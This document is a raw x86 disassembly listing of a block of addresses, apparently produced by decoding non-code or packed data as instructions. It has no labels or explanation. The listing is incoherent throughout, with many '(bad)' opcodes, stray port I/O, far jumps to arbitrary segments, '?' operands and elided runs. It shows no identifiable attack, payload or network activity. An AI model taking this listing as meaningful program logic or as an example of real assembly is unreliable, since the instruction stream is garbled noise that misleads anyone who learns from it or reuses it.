  43baad:	jmp    0xd623520c
  43bab2:	push   cs
  43bab3:	test   DWORD PTR [ecx+edx*1],0xfe4e04b4
  43baba:	mov    dl,0x8f
  43babc:	lods   al,BYTE PTR ds:[esi]
  43babd:	out    0xdb,eax
  43babf:	mov    ah,0xbe
  43bac1:	add    edi,ebp
  43bac3:	repnz inc esp
  43bac5:	adc    al,0x34
  43bac7:	add    eax,0xf7f7ef6e
  43bacc:	jmp    FWORD PTR [eax+0x55bddf7]
  43bad2:	add    BYTE PTR [ecx-0x1773d9ff],dl
  43bad8:	pop    ss
  43bad9:	push   ds
  43bada:	sub    DWORD PTR [edi],ebx
  43badc:	jae    0x43baab
  43bade:	lahf   
  43badf:	pop    ds
  43bae0:	shl    BYTE PTR [edi+0x0],cl
	...
  43bafa:	add    al,ah
  43bafc:	xchg   BYTE PTR ss:[ebp+0x75faf893],al
  43bb03:	fwait
  43bb04:	or     al,0xe8
  43bb06:	dec    edx
  43bb07:	aas    
  43bb08:	sbb    edx,edi
  43bb0a:	imul   esp,DWORD PTR [ebx+0x10],0x1f8d5c01
  43bb11:	xor    al,0x5d
  43bb13:	xor    bl,bl
  43bb15:	inc    eax
  43bb17:	lods   al,BYTE PTR ds:[esi]
  43bb18:	out    0xfa,al
  43bb1a:	into   
  43bb1b:	dec    eax
  43bb1c:	and    al,0x4b
  43bb1e:	je     0x43bb38
  43bb20:	pop    ds
  43bb21:	test   DWORD PTR ds:0x175b0f4c,esp
  43bb27:	sub    eax,0xb60ce483
  43bb2c:	add    eax,DWORD PTR [eax]
  43bb2e:	cmp    al,0xcd
  43bb30:	das    
  43bb31:	push   eax
  43bb32:	cmp    al,BYTE PTR [ebp+0x4d]
  43bb35:	sub    eax,0xee33dfb2
  43bb3a:	mov    fs,eax
  43bb3c:	xchg   DWORD PTR [edi-0xc58c0a],edi
  43bb42:	call   0xeeab733e
  43bb47:	ja     0x43bb65
  43bb49:	cli    
  43bb4a:	outs   dx,BYTE PTR ds:[esi]
  43bb4b:	jmp    0x4489:0xf7a91038
  43bb52:	pop    ebp
  43bb53:	daa    
  43bb54:	jmp    0x43bb2c
  43bb56:	push   esi
  43bb57:	loop   0x43bb5d
  43bb59:	pop    gs
  43bb5b:	div    DWORD PTR [edx+edi*8+0x0]
	...
  43bb76:	add    BYTE PTR [eax],al
  43bb78:	enter  0x933,0x40
  43bb7c:	int    0x9c
  43bb7e:	repnz test DWORD PTR [edx],esp
  43bb81:	push   esp
  43bb82:	pop    eax
  43bb83:	push   esi
  43bb84:	into   
  43bb85:	shl    DWORD PTR [edi],1
  43bb87:	pop    ebp
  43bb88:	adc    DWORD PTR [edx+0x48],ebp
  43bb8b:	mov    ebx,ecx
  43bb8d:	nop
  43bb8e:	add    eax,0x59
  43bb91:	inc    esi
  43bb92:	pusha  
  43bb93:	add    ebp,0x3a
  43bb96:	jae    0x43bbd3
  43bb98:	mov    ds:0xe024290,al
  43bb9d:	jmp    DWORD PTR [eax+0x74]
  43bba0:	mov    dl,0x84
  43bba2:	out    0x8,eax
  43bba4:	or     DWORD PTR [ebx],esp
  43bba6:	jns    0x43bb91
  43bba8:	call   0x7926:0x2849026b
  43bbaf:	retf   
  43bbb0:	(bad)  
  43bbb1:	cli    
  43bbb2:	sbb    al,BYTE PTR [ebx-0x7ca1fb63]
  43bbb8:	cmc    
  43bbb9:	add    BYTE PTR [edi+edx*1-0x3],dh
  43bbbd:	out    dx,eax
  43bbbe:	adc    edi,DWORD PTR [ebx+edi*1+0x47]
  43bbc2:	cli    
  43bbc3:	pop    eax
  43bbc4:	jle    0x43bbca
  43bbc6:	in     eax,0x43
  43bbc8:	pop    ebp
  43bbc9:	cli    
  43bbca:	add    al,BYTE PTR [ebx+0x3e2f086]
  43bbd0:	into   
  43bbd1:	fild   DWORD PTR [edx]
  43bbd3:	inc    esi
  43bbd4:	inc    esi
  43bbd5:	push   esp
  43bbd6:	idiv   BYTE PTR [edi+ebp*8+0x37]
  43bbda:	cmc    
  43bbdb:	adc    eax,0x0
	...
  43bbf4:	add    BYTE PTR [ebp+0x3003ff2],ah
  43bbfa:	push   eax
  43bbfb:	lock ret 
  43bbfd:	pop    ds
  43bbfe:	imul   ebx,DWORD PTR [ecx],0xffffffe8
  43bc01:	leave  
  43bc02:	mov    ch,0xf5
  43bc04:	jmp    DWORD PTR [ebp-0xb00aa27]
  43bc0a:	mov    dl,0x2d
  43bc0c:	add    al,0x14
  43bc0e:	jmp    0x734b:0x95f7ffc2
  43bc15:	adc    BYTE PTR [esi],dh
  43bc17:	(bad)  
  43bc18:	mov    bh,0xfc
  43bc1a:	out    dx,eax
  43bc1b:	ret    0xdbff
  43bc1e:	sbb    eax,0xf7cbfa4a
  43bc23:	add    eax,0x1bedb787
  43bc28:	add    eax,edx
  43bc2a:	(bad)  
  43bc2c:	add    BYTE PTR [ebx],al
  43bc2e:	mov    dl,0x43
  43bc30:	rcr    BYTE PTR [edi-0x688031d1],0x2d
  43bc37:	cmc    
  43bc38:	mov    cl,0xb7
  43bc3a:	jl     0x43bc52
  43bc3c:	or     al,0x90
  43bc3e:	sub    esp,DWORD PTR ds:0x49a8ac85
  43bc44:	jae    0x43bc2e
  43bc46:	xor    edi,edi
  43bc48:	pop    ds
  43bc49:	call   0x9c26:0xe7fe03ef
  43bc50:	cli    
  43bc51:	imul   edi,DWORD PTR [ecx],0xffffff9a
  43bc54:	or     eax,0xc8c92bb4
	...
  43bc71:	add    BYTE PTR [edi],dh
  43bc73:	pop    ds
  43bc74:	sub    DWORD PTR ds:[edi],0x3b
  43bc78:	mov    bh,BYTE PTR [edi-0x43f09d5c]
  43bc7e:	out    0xeb,al
  43bc80:	add    ecx,esp
  43bc82:	mov    eax,ds:0x208012a6
  43bc87:	sub    al,0x4
  43bc89:	add    ah,dh
  43bc8b:	dec    ch
  43bc8d:	push   edx
  43bc8e:	mov    gs,WORD PTR ds:0xbf4aef96
  43bc94:	jge    0x43bc1c
  43bc96:	or     al,0x84
  43bc98:	cmc    
  43bc99:	hlt    
  43bc9a:	or     eax,DWORD PTR ds:0x8c2af662
  43bca0:	mov    eax,ds:0xe145c2fb
  43bca5:	jg     0x43bc9c
  43bca7:	add    ebp,ecx
  43bca9:	add    edi,DWORD PTR [ecx+0x4f]
  43bcac:	call   0x505d9ada
  43bcb1:	cli    
  43bcb2:	pop    ds
  43bcb3:	sbb    esi,DWORD PTR [ecx]
  43bcb5:	jle    0x43bcef
  43bcb7:	dec    ebx
  43bcb8:	gs mov eax,0x3f319cf
  43bcbe:	hlt    
  43bcbf:	test   al,ch
  43bcc1:	ror    DWORD PTR [edx],cl
  43bcc3:	inc    ebp
  43bcc4:	ror    al,1
  43bcc6:	sti    
  43bcc7:	or     DWORD PTR [ebx+eax*2+0x2a],esi
  43bccb:	inc    ebp
  43bccc:	in     eax,0xd3
  43bcce:	sbb    DWORD PTR [ecx+edx*4],eax
  43bcd1:	add    esi,esp
  43bcd3:	add    al,0x29
  43bcd5:	js     0x43bcd7
	...
  43bcef:	ss cmc 
  43bcf1:	cwde   
  43bcf2:	js     0x43bd24
  43bcf4:	sbb    eax,edx
  43bcf6:	lahf   
  43bcf7:	iret   
  43bcf8:	sbb    bl,cl
  43bcfa:	cmp    BYTE PTR [ebx],0x9
  43bcfd:	ins    DWORD PTR es:[edi],dx
  43bcfe:	pop    edx
  43bcff:	jae    0x43bd1a
  43bd01:	call   0x185c6d7c
  43bd06:	ja     0x43bcf0
  43bd08:	adc    al,0xd0
  43bd0a:	jae    0x43bd1b
  43bd0c:	sbb    esi,DWORD PTR [ecx+0x65099380]
  43bd12:	mov    cs,WORD PTR [ebx+0x19]
  43bd15:	call   0x11545e04
  43bd1a:	sti    
  43bd1b:	je     0x43bcb4
  43bd1d:	cwde   
  43bd1e:	add    al,0xf4
  43bd20:	add    al,0xf9
  43bd22:	mov    ch,0xe6
  43bd24:	mov    ch,0x15
  43bd26:	aad    0x70
  43bd28:	mov    edi,0xe81e1c7c
  43bd2d:	push   DWORD PTR [esi-0x23]
  43bd30:	test   DWORD PTR [edi+0x741e02f5],edi
  43bd36:	gs int 0xf0
  43bd39:	pop    ebx
  43bd3a:	sti    
  43bd3b:	aaa    
  43bd3c:	sbb    DWORD PTR [ebx-0x73105cd7],eax
  43bd42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43bd43:	adc    esp,DWORD PTR [eax]
  43bd45:	add    edx,DWORD PTR ds:0x4fb81b0e
  43bd4b:	test   DWORD PTR [eax+eax*1],0xfc185364
  43bd52:	add    BYTE PTR cs:[eax],al
	...
  43bd69:	add    BYTE PTR [eax],al
  43bd6b:	add    BYTE PTR ds:0x7ea91780,bl
  43bd71:	xchg   ecx,eax
  43bd72:	cmc    
  43bd73:	adc    bl,BYTE PTR [esi+0x7f]
  43bd76:	inc    esp
  43bd77:	adc    eax,0x6ae590dd
  43bd7c:	arpl   WORD PTR [edx+edi*8],bx
  43bd7f:	cdq    
  43bd80:	(bad)  
  43bd81:	clc    
  43bd82:	int    0xfc
  43bd84:	int3   
  43bd85:	into   
  43bd86:	mov    esi,0xe7c7967c
  43bd8b:	mov    edi,?
  43bd8d:	add    al,0x0
  43bd8f:	je     0x43bdd3
  43bd91:	sbb    al,0xe7
  43bd93:	scas   al,BYTE PTR es:[edi]
  43bd94:	cwde   
  43bd95:	push   ds
  43bd96:	cli    
  43bd97:	nop
  43bd98:	or     eax,0xe2e90005
  43bd9d:	cmp    bh,0xc6
  43bda0:	or     al,0x1b
  43bda2:	xchg   ecx,esp
  43bda4:	aaa    
  43bda5:	int    0x74
  43bda7:	mov    bl,0xf0
  43bda9:	fmul   QWORD PTR [eax+0x44894c26]
  43bdaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43bdb0:	fist   WORD PTR [esi+eiz*1-0x61]
  43bdb4:	or     al,0x5d
  43bdb6:	jmp    0x8d48b5a3
  43bdbb:	neg    DWORD PTR fs:[edx]
  43bdbe:	cli    
  43bdbf:	add    BYTE PTR [edx-0x64],bh
  43bdc2:	adc    al,BYTE PTR [eax-0x1c]
  43bdc5:	addr16 hlt 
  43bdc7:	mov    al,0x1c
  43bdc9:	stc    
  43bdca:	adc    DWORD PTR [ebp-0x6b1d1330],ecx
	...
  43bde8:	add    dh,ah
  43bdea:	jmp    0x0:0x2abb9f5
  43bdf1:	pop    eax
  43bdf2:	xchg   edi,eax
  43bdf3:	cli    
  43bdf4:	std    
  43bdf5:	cmp    ch,ch
  43bdf7:	sbb    BYTE PTR [eax],0x8d
  43bdfa:	pop    edx
  43bdfb:	jae    0x43bdf7
  43bdfd:	ffreep st(3)
  43bdff:	push   ebp
  43be00:	pop    esi
  43be01:	data16 fidivr DWORD PTR [esp+eax*1-0x137eb923]
  43be09:	dec    esp
  43be0a:	lock out dx,al
  43be0c:	add    ebp,ecx
  43be0e:	add    ecx,DWORD PTR [ebx+0x33]
  43be11:	out    0x35,al
  43be13:	aaa    
  43be14:	pop    edi
  43be15:	leave  
  43be16:	addr16 push edi
  43be18:	cmp    BYTE PTR [eax+0x1b],bl
  43be1b:	jae    0x43be54
  43be1d:	or     BYTE PTR [edi-0x207501f6],ah
  43be23:	loop   0x43be0e
  43be25:	inc    edi
  43be26:	in     eax,dx
  43be27:	cmc    
  43be28:	cmp    DWORD PTR [eax],edi
  43be2a:	retf   
  43be2b:	ins    DWORD PTR es:[edi],dx
  43be2c:	add    eax,0x76d04dd4
  43be31:	ins    BYTE PTR es:[edi],dx
  43be32:	call   0x50d0:0x45c80c55
  43be39:	std    
  43be3a:	xor    BYTE PTR [edx-0x18],cl
  43be3d:	mov    esi,0x4efff82e
  43be42:	retf   0xeeb7
  43be45:	pop    esp
  43be46:	add    eax,DWORD PTR [eax]
  43be48:	(bad)  
  43be49:	shl    al,1
  43be4b:	cmc    
  43be4c:	inc    DWORD PTR [eax]
	...
  43be66:	pop    edx
  43be67:	cwde   
  43be68:	adc    al,BYTE PTR [eax-0xc]
  43be6b:	in     al,0xb0
  43be6d:	cmc    
  43be6e:	jg     0x43be5e
  43be70:	div    DWORD PTR [esi]
  43be72:	daa    
  43be73:	sbb    edi,edi
  43be75:	out    0xde,eax
  43be77:	jl     0x43bea1
  43be79:	cli    
  43be7a:	jge    0x43be6a
  43be7c:	div    DWORD PTR [edi]
  43be7e:	test   eax,0x7108aa25
  43be83:	pushw  cs
  43be85:	push   eax
  43be86:	or     al,0x13
  43be88:	sar    ecx,1
  43be8a:	repz mov ds:0xeb2f07ba,eax
  43be90:	scas   eax,DWORD PTR es:[edi]
  43be91:	or     BYTE PTR [esp+esi*4+0x35],al
  43be95:	mov    eax,ds:0x5a7cd7d9
  43be9a:	cld    
  43be9b:	ins    DWORD PTR es:[edi],dx
  43be9c:	(bad)
  43be9f:	and    dh,bh
  43bea1:	push   esp
  43bea2:	outs   dx,DWORD PTR ds:[esi]
  43bea3:	lock jle 0x43bf08
  43bea6:	in     al,dx
  43bea7:	sub    edi,DWORD PTR [ebp+0x62]
  43beaa:	add    BYTE PTR [ebx+eax*4],ch
  43bead:	jmp    0x43bebb
  43beaf:	sub    bh,dh
  43beb1:	inc    DWORD PTR [edi+0x76]
  43beb4:	ja     0x43be6a
  43beb6:	mov    ds,WORD PTR [ecx]
  43beb8:	and    edx,edi
  43beba:	sub    DWORD PTR [edi+0xe],0x24521de8
  43bec1:	cli    
  43bec2:	stc    
  43bec3:	jns    0x43bec8
  43bec5:	add    ah,dh
  43bec7:	mov    cl,0xf
  43bec9:	push   eax
	...
  43bee2:	add    dh,bl
  43bee4:	sub    esi,DWORD PTR [edi+0x74]
  43bee7:	dec    esp
  43bee8:	stos   DWORD PTR es:[edi],eax
  43bee9:	ss cli 
  43beeb:	dec    esp
  43beec:	or     BYTE PTR [edx+edi*8+0x793ea15b],dh
  43bef3:	jmp    0x43be97
  43bef5:	cmp    al,0x4f
  43bef7:	fsub   QWORD PTR [ebx+0x4f43e1e]
  43befd:	ss sbb al,0x3f
  43bf00:	dec    edx
  43bf01:	call   0x6b90:0xe1457826
  43bf08:	sub    DWORD PTR [eax-0x572e0750],0x40026c9d
  43bf12:	adc    eax,0x78e904f4
  43bf17:	jo     0x43bf44
  43bf19:	imul   esp,DWORD PTR [esi],0xfffffffe
  43bf1c:	ds call 0xd40f7325
  43bf22:	sub    al,0x4d
  43bf24:	mov    ch,BYTE PTR [ecx]
  43bf26:	retf   0x41bc
  43bf29:	mov    bl,0x7a
  43bf2b:	iret   
  43bf2c:	or     DWORD PTR [ebx+ebp*1+0x74],0xf401e828
  43bf34:	add    al,0x5e
  43bf36:	shl    bl,0xd1
  43bf39:	pop    ds
  43bf3a:	int    0x26
  43bf3c:	mov    WORD PTR [edi+ebx*8-0x50d82611],?
  43bf43:	mov    cl,0x8c
  43bf45:	loopne 0x43bf1b
	...
  43bf5f:	add    BYTE PTR [edx+0x41],dh
  43bf62:	add    BYTE PTR [ebp-0x60],ch
  43bf65:	adc    eax,0x55b7f01
  43bf6a:	xchg   BYTE PTR gs:[ebx+0x778e815],dl
  43bf71:	loope  0x43bf43
  43bf73:	cmp    eax,0x3f8e137
  43bf78:	mov    WORD PTR [ebx],fs
  43bf7a:	pop    ds
  43bf7b:	outs   dx,BYTE PTR es:[esi]
  43bf7d:	mov    DWORD PTR [ebp-0x8],edx
  43bf80:	push   ebx
  43bf81:	push   0x805e27b7
  43bf86:	test   al,0xb0
  43bf88:	ror    BYTE PTR [ecx-0x7f7f07c3],1
  43bf8e:	dec    DWORD PTR [eax+ebp*4]
  43bf91:	adc    eax,0x8827e9fa
  43bf96:	inc    ebx
  43bf97:	int    0xe7
  43bf99:	mov    ah,0xe7
  43bf9b:	icebp  
  43bf9c:	lds    ebx,FWORD PTR [eax]
  43bf9e:	cli    
  43bf9f:	ins    DWORD PTR es:[edi],dx
  43bfa0:	mov    al,0x91
  43bfa2:	dec    ebx
  43bfa3:	bound  esp,QWORD PTR [ecx+eiz*8+0xb]
  43bfa7:	je     0x43bff5
  43bfa9:	loope  0x43bfbe
  43bfab:	jo     0x43bff1
  43bfad:	loope  0x43bfc2
  43bfaf:	xor    DWORD PTR [eax+0x5e],0x55746efc
  43bfb6:	je     0x43bfb9
  43bfb8:	jnp    0x43bfcd
  43bfba:	jae    0x43bfa8
  43bfbc:	sbb    dh,dl
  43bfbe:	out    0x7a,eax
  43bfc0:	outs   dx,DWORD PTR ds:[esi]
  43bfc1:	psubd  mm6,QWORD PTR [edi+0x0]
	...
  43bfdc:	add    bh,bh
  43bfde:	or     BYTE PTR [eax+0x63931146],0x5
  43bfe5:	int3   
  43bfe6:	adc    al,0xe5
  43bfe8:	or     eax,0x6407c94d
  43bfed:	cmp    BYTE PTR [eax+0x7d7207],bl
  43bff3:	xchg   DWORD PTR [eax+0x62077dcf],esi
  43bff9:	mov    ch,0x0
  43bffb:	xchg   DWORD PTR [ecx+0x72067d9f],esp
  43c001:	mov    al,0x0
  43c003:	mov    DWORD PTR [edx+0x2f042b93],ebp
  43c009:	mov    ah,0xe8
  43c00b:	psubsb mm3,mm0
  43c00e:	xchg   edi,eax
  43c00f:	and    edi,ecx
  43c011:	cld    
  43c012:	sbb    ah,bh
  43c014:	xor    al,0x1a
  43c016:	psubd  mm2,QWORD PTR [eax-0x16fffaff]
  43c01d:	jmp    0xfad2:0x550023c7
  43c024:	call   FWORD PTR ds:0xd6f97350
  43c02a:	push   ebx
  43c02b:	push   ds
  43c02c:	or     al,0xf2
  43c02e:	dec    edx
  43c02f:	and    ebp,0xfffec6b0
  43c035:	call   0x79c7a6c7
  43c03a:	loopne 0x43c0b5
  43c03c:	in     al,dx
  43c03d:	xor    DWORD PTR ds:0x5750,esi
	...
  43c057:	add    BYTE PTR [eax],al
  43c059:	add    BYTE PTR [ebp-0x6d00f0d1],al
  43c05f:	aaa    
  43c060:	loop   0x43c0d2
  43c062:	(bad)  
  43c063:	jmp    0x93a94c5d
  43c068:	ror    DWORD PTR [edi],1
  43c06a:	mov    DWORD PTR [edi],esp
  43c06c:	(bad)  
  43c06d:	(bad)  
  43c06e:	fstp   QWORD PTR [edx-0x7112db8a]
  43c074:	push   esi
  43c075:	and    al,0xdd
  43c077:	out    dx,eax
  43c078:	loope  0x43c024
  43c07a:	xor    cl,ch
  43c07c:	jle    0x43c03e
  43c07e:	loop   0x43c013
  43c080:	clc    
  43c081:	add    ch,bl
  43c083:	pop    es
  43c084:	lea    esi,[ecx+edi*8+0x24]
  43c088:	loop   0x43c065
  43c08a:	es jmp 0x43c082
  43c08d:	push   0xffffffbc
  43c08f:	mov    eax,es
  43c091:	push   eax
  43c092:	ja     0x43c103
  43c094:	dec    ecx
  43c095:	call   0x3c62ed
  43c09a:	or     eax,ecx
  43c09c:	add    eax,0x7fd84
  43c0a1:	add    BYTE PTR [esi],dl
  43c0a3:	ror    DWORD PTR [edx-0x18],1
  43c0a6:	push   edx
  43c0a7:	lods   al,BYTE PTR ds:[esi]
  43c0a8:	sti    
  43c0a9:	dec    DWORD PTR [ecx]
  43c0ab:	leave  
  43c0ac:	add    eax,0x8ad84
  43c0b1:	add    ah,dh
  43c0b3:	test   al,0x97
  43c0b5:	and    ecx,DWORD PTR [eax]
  43c0b7:	inc    esi
  43c0b8:	shr    DWORD PTR [ecx+0xca94a59],1
	...
  43c0d6:	add    BYTE PTR [edi+0x6b],bh
  43c0d9:	mov    bl,0x65
  43c0db:	fldz   
  43c0dd:	sub    ebp,DWORD PTR [edi]
  43c0df:	mov    DWORD PTR [ebx+0x1e],esp
  43c0e2:	xor    DWORD PTR [edx+ebx*1],0xffffff82
  43c0e6:	lods   eax,DWORD PTR ds:[esi]
  43c0e7:	hlt    
  43c0e8:	sbb    eax,0x41b08cfe
  43c0ed:	out    dx,al
  43c0ee:	dec    edi
  43c0ef:	or     al,0x47
  43c0f1:	push   ebx
  43c0f2:	cld    
  43c0f3:	sbb    edx,DWORD PTR [esi+0x190a8413]
  43c0f9:	in     al,0xfa
  43c0fb:	add    BYTE PTR [ecx-0x12],0x51
  43c0ff:	mov    ss,WORD PTR [edx]
  43c101:	mov    cl,0xe7
  43c103:	out    dx,eax
  43c104:	jo     0x43c123
  43c106:	cli    
  43c107:	dec    edx
  43c108:	xchg   esp,eax
  43c109:	(bad)  
  43c10a:	and    eax,DWORD PTR [edi]
  43c10c:	les    esi,FWORD PTR [ecx-0x79]
  43c10f:	jecxz  0x43c0d4
  43c111:	cmp    DWORD PTR [ebx+0x10],0x1b
  43c115:	dec    BYTE PTR [edx]
  43c117:	js     0x43c0b5
  43c119:	add    eax,DWORD PTR [eax]
  43c11b:	hlt    
  43c11c:	fwait
  43c11d:	mov    al,ds:0x9857f407
  43c122:	mov    WORD PTR [eax],?
  43c124:	inc    eax
  43c125:	out    dx,al
  43c126:	dec    edi
  43c127:	pushf  
  43c128:	xchg   esp,eax
  43c129:	ins    DWORD PTR es:[edi],dx
  43c12a:	cld    
  43c12b:	stos   DWORD PTR es:[edi],eax
  43c12c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c12d:	adc    eax,DWORD PTR [edx+ebp*4+0x20fb0078]
  43c134:	inc    eax
  43c135:	out    dx,al
  43c136:	push   ecx
  43c137:	push   ds
  43c138:	xor    BYTE PTR [ecx+0xe7],0x0
	...
  43c153:	add    BYTE PTR [edi+0x2afa1dd0],ah
  43c159:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c15a:	(bad)  
  43c15b:	and    esp,edi
  43c15d:	add    al,0xd1
  43c15f:	mov    ebp,0x83d9127b
  43c164:	out    dx,eax
  43c165:	call   0xc12bc54b
  43c16a:	pop    ebx
  43c16b:	lahf   
  43c16c:	pop    ss
  43c16d:	stc    
  43c16e:	rcr    cl,1
  43c170:	mov    ds:0xfbadb910,al
  43c175:	jge    0x43c120
  43c177:	mov    bl,0xd9
  43c179:	xchg   esp,eax
  43c17a:	adc    eax,0xa2598f2c
  43c17f:	and    dh,BYTE PTR [edi+0x45]
  43c182:	adc    al,0xd6
  43c184:	js     0x43c14f
  43c186:	int3   
  43c187:	repz mov bl,0x1c
  43c18a:	jnp    0x43c1e2
  43c18c:	sbb    BYTE PTR [edx],dl
  43c18e:	ins    DWORD PTR es:[edi],dx
  43c18f:	adc    edi,DWORD PTR [eax+0x1b]
  43c192:	hlt    
  43c193:	add    DWORD PTR [edi],ecx
  43c195:	cdq    
  43c196:	int3   
  43c197:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c199:	sahf   
  43c19a:	div    DWORD PTR [esi+0x219c7e13]
  43c1a0:	out    dx,al
  43c1a1:	mov    edx,0xf617c770
  43c1a6:	inc    eax
  43c1a7:	cmc    
  43c1a8:	jnp    0x43c1bb
  43c1aa:	dec    ecx
  43c1ab:	sbb    DWORD PTR [edi-0x17],0xfffffff1
  43c1af:	add    ecx,DWORD PTR [eax+0x9]
  43c1b2:	outs   dx,BYTE PTR ds:[esi]
  43c1b3:	inc    esi
  43c1b4:	rol    BYTE PTR [ecx],cl
  43c1b6:	xor    dl,dh
	...
  43c1d0:	add    bl,bl
  43c1d2:	add    al,0x61
  43c1d4:	and    bh,BYTE PTR [esi+0x761d10b5]
  43c1da:	adc    DWORD PTR [ecx],ebx
  43c1dc:	(bad)  
  43c1dd:	imul   esi,DWORD PTR [ecx+0x277abeb2],0xffffffab
  43c1e4:	inc    ebp
  43c1e5:	test   DWORD PTR [esp+ebx*4],0x4859f8e
  43c1ec:	sbb    esi,DWORD PTR [eax+eiz*1-0x1]
  43c1f0:	int3   
  43c1f1:	sti    
  43c1f2:	add    al,0x0
  43c1f4:	push   0xe8fff954
  43c1f9:	xlat   BYTE PTR ds:[ebx]
  43c1fa:	adc    DWORD PTR [ebp+0x37],ecx
  43c1fd:	lods   eax,DWORD PTR ds:[esi]
  43c1fe:	(bad)  
  43c1ff:	jle    0x43c24b
  43c201:	test   DWORD PTR [eax+eax*1],0xfafeabc1
  43c208:	(bad)  
  43c209:	mov    BYTE PTR [ecx],ch
  43c20b:	adc    eax,DWORD PTR [ecx-0x6e79f0ea]
  43c211:	sub    DWORD PTR [esi],ecx
  43c213:	ss mov fs,ebp
  43c216:	mov    BYTE PTR [ebx-0x18],cl
  43c219:	test   DWORD PTR [ecx*4+0x4ff51c25],0x17e53460
  43c224:	add    DWORD PTR [esi],0x7c86fc6b
  43c22a:	push   ecx
  43c22b:	or     ah,BYTE PTR [ebp+0x1f]
  43c22e:	add    al,0x0
  43c230:	jmp    0xd96787a7
	...
  43c24d:	add    BYTE PTR [edi+0x29],al
  43c250:	xor    eax,0x860b1392
  43c255:	pop    ecx
  43c256:	leave  
  43c257:	adc    esi,DWORD PTR [ebx+0xb]
  43c25a:	adc    eax,0x9df92394
  43c25f:	stos   BYTE PTR es:[edi],al
  43c260:	imul   ebx,DWORD PTR [edx+0x3fae181f],0x15
  43c267:	mov    dh,0x87
  43c269:	lods   eax,DWORD PTR ds:[esi]
  43c26a:	(bad)  
  43c26c:	out    0xae,eax
  43c26e:	ins    BYTE PTR es:[edi],dx
  43c26f:	or     edi,edx
  43c271:	imul   edx,DWORD PTR [esp+eiz*8+0xa],0xf28904e9
  43c279:	jmp    0x95d0c775
  43c27e:	xchg   ebx,eax
  43c27f:	clc    
  43c280:	out    0x0,eax
  43c282:	retf   0xfb94
  43c285:	jmp    DWORD PTR [edi-0x1]
  43c288:	add    dh,0x5d
  43c28b:	bound  ebp,QWORD PTR [ebx+0x53]
  43c28e:	cmc    
  43c28f:	mov    edi,0x885afea9
  43c294:	mov    edx,0xfacad10f
  43c299:	dec    DWORD PTR [ebp+0x62]
  43c29c:	(bad)  
  43c29d:	sar    DWORD PTR [bx+0x3a],1
  43c2a1:	add    BYTE PTR [edi-0x3c17b689],ah
  43c2a7:	mov    eax,0xc3d1fff8
  43c2ac:	add    eax,0x48f84
	...
  43c2c9:	add    BYTE PTR [eax],al
  43c2cb:	pop    es
  43c2cc:	std    
  43c2cd:	mov    WORD PTR [ebp+0x25],es
  43c2d0:	push   esp
  43c2d1:	fs jbe 0x43c2b2
  43c2d4:	loopne 0x43c270
  43c2d6:	mov    bl,0x6b
  43c2d8:	in     eax,0x7e
  43c2da:	ror    BYTE PTR [edx],0x88
  43c2dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c2de:	add    BYTE PTR ds:0x257d3904,bl
  43c2e4:	outs   dx,BYTE PTR ds:[esi]
  43c2e5:	adc    bh,bh
  43c2e7:	add    BYTE PTR [esi*8+0x6d61f175],cl
  43c2ee:	push   ebx
  43c2ef:	inc    ebp
  43c2f0:	xchg   DWORD PTR [ecx-0x4577b502],ebp
  43c2f6:	sqrtps xmm2,XMMWORD PTR [ebx+0x2addfffa]
  43c2fd:	jnp    0x43c30b
  43c2ff:	xor    esp,0x61d975f6
  43c305:	addr16 push ebx
  43c307:	xor    eax,0xdafea9df
  43c30c:	xchg   DWORD PTR [edx+0x7b2a8874],edi
  43c312:	adc    ah,dh
  43c314:	jno    0x43c325
  43c316:	sti    
  43c317:	and    DWORD PTR [esi],ecx
  43c319:	lods   al,BYTE PTR ds:[esi]
  43c31a:	gs daa 
  43c31c:	div    BYTE PTR ds:0x810e8aae
  43c322:	mov    edi,0x7b898508
  43c327:	rol    BYTE PTR [ebp+0x48],1
  43c32a:	inc    ebx
  43c32b:	sbb    BYTE PTR [edi],dl
  43c32d:	(bad)  
  43c32e:	out    0x0,eax
	...
  43c348:	ret    
  43c349:	xor    DWORD PTR [edx],ebx
  43c34b:	cli    
  43c34c:	into   
  43c34d:	sbb    al,0x85
  43c34f:	ret    0x964c
  43c352:	adc    eax,0x43a153fa
  43c357:	jae    0x43c35d
  43c359:	mov    eax,ds:0x1bb42357
  43c35e:	(bad)  
  43c35f:	dec    DWORD PTR [ebp+eiz*2-0x2f]
  43c363:	stc    
  43c364:	xor    edx,DWORD PTR [edx-0x5f1fdc61]
  43c36a:	xchg   DWORD PTR [ebx],esp
  43c36c:	inc    esp
  43c36d:	sbb    edi,esi
  43c36f:	inc    esp
  43c371:	retf   0xb22b
  43c374:	inc    ecx
  43c375:	mov    BYTE PTR [edx],bl
  43c377:	xchg   DWORD PTR [eax+0x12b90949],esi
  43c37d:	sbb    al,0xfe
  43c37f:	jmp    FWORD PTR [edi+0x67]
  43c382:	inc    ecx
  43c383:	push   ebx
  43c385:	pop    esp
  43c386:	retf   
  43c387:	je     0x43c376
  43c389:	xor    bh,dh
  43c38b:	mov    WORD PTR [eax+0x0],fs
  43c38e:	lock out 0x6a,eax
  43c391:	mov    bl,0x1a
  43c393:	cli    
  43c394:	ror    DWORD PTR [ebx],cl
  43c396:	mov    BYTE PTR es:[edx-0x31],dh
  43c39a:	sbb    cl,BYTE PTR [esi-0x34]
  43c39d:	fwait
  43c39e:	cmp    edx,0x23c7a2bb
  43c3a4:	add    eax,DWORD PTR ds:0xd2af0f0e
  43c3aa:	adc    BYTE PTR [esi+0x0],dl
	...
  43c3c4:	add    BYTE PTR [ebp+0xe],dh
  43c3c7:	adc    DWORD PTR [ebx+0x1f629593],esi
  43c3cd:	mov    ss,ebx
  43c3cf:	sub    BYTE PTR [edi+0x296daa2d],bh
  43c3d5:	and    BYTE PTR [ebx-0x24],al
  43c3d8:	add    esp,DWORD PTR [ecx]
  43c3da:	jp     0x43c3d8
  43c3dc:	mov    dh,ch
  43c3de:	adc    esp,0x4eb5bab7
  43c3e4:	add    eax,0xb484c071
  43c3e9:	(bad)
  43c3ec:	push   ds
  43c3ed:	ret    
  43c3ee:	aam    0x6b
  43c3f0:	inc    ebx
  43c3f1:	rol    ch,0x6d
  43c3f4:	enter  0xd087,0xe8
